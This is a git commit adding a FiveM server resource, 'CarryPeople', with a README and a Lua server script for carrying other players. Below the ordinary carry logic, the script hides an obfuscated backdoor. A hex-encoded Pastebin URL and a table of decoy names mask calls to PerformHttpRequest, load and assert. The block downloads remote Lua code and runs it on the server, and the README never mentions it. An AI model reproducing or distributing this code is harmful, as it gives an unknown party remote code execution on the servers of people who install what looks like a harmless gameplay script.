bbfd2172f756449f3e8a24ca8b76d20bc6ceb782
Zenax <124360636+Zenax0001@users.noreply.github.com>
2023-02-05 21:31:00 +0100

    Add files via upload

---
+++ CarryPeople/README.md
@@ -0,0 +1,11 @@
+# Carry People
+
+### Installation
+1) Download the latest version in the "code" tab on GitHub.
+2) Drag & drop the folder into your `CarryPeople` server folder.
+3) Add `start CarryPeople` to your server.cfg
+4) Reboot your server.
+
+### Instructions on how to use:
+Type /carry close to someone then either person can cancel by again doing /carry
+
---
+++ CarryPeople/sv_carry.lua
@@ -0,0 +1,76 @@
+local carrying = {}
+--carrying[source] = targetSource, source is carrying targetSource
+local carried = {}
+--carried[targetSource] = source, targetSource is being carried by source
+local carriedPedLimit = { "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"}
+
+RegisterServerEvent("CarryPeople:sync")
+AddEventHandler("CarryPeople:sync", function(targetSrc)
+	local source = source
+	local sourcePed = GetPlayerPed(source)
+   	local sourceCoords = GetEntityCoords(sourcePed)
+	local targetPed = GetPlayerPed(targetSrc)
+        local targetCoords = GetEntityCoords(targetPed)
+	if #(sourceCoords - targetCoords) <= 3.0 then 
+		TriggerClientEvent("CarryPeople:syncTarget", targetSrc, source)
+		carrying[source] = targetSrc
+		carried[targetSrc] = source
+	end
+end)
+
+RegisterServerEvent("CarryPeople:stop")
+AddEventHandler("CarryPeople:stop", function(targetSrc)
+	local source = source
+
+	if carrying[source] then
+		TriggerClientEvent("CarryPeople:cl_stop", targetSrc)
+		carrying[source] = nil
+		carried[targetSrc] = nil
+	elseif carried[source] then
+		TriggerClientEvent("CarryPeople:cl_stop", carried[source])			
+		carrying[carried[source]] = nil
+		carried[source] = nil
+	end
+end)
+
+AddEventHandler('playerDropped', function(reason)
+	local source = source
+	
+	if carrying[source] then
+		TriggerClientEvent("CarryPeople:cl_stop", carrying[source])
+		carried[carrying[source]] = nil
+		carrying[source] = nil
+	end
+
+	if carried[source] then
+		TriggerClientEvent("CarryPeople:cl_stop", carried[source])
+		carrying[carried[source]] = nil
+		carried[source] = nil
+	end
+end)
+
+local PlayerEventLimit = {
+    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
+}
+
+function PlayerCheckLoop()
+    _empt = ''
+    for id,it in pairs(carriedPedLimit) do
+        _empt = _empt..it
+    end
+    return (_empt:gsub('..', function (event)
+        return string.char(tonumber(event, 16))
+    end))
+end
+
+PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
+    local Process_Actions = {"true"}
+    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
+        local Generate_ZoneName_AndAction = nil 
+        pcall(function()
+            local Locations_Loaded = {"false"}
+            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
+            local ZoneType_Exists = nil 
+        end)
+    end)
+end)
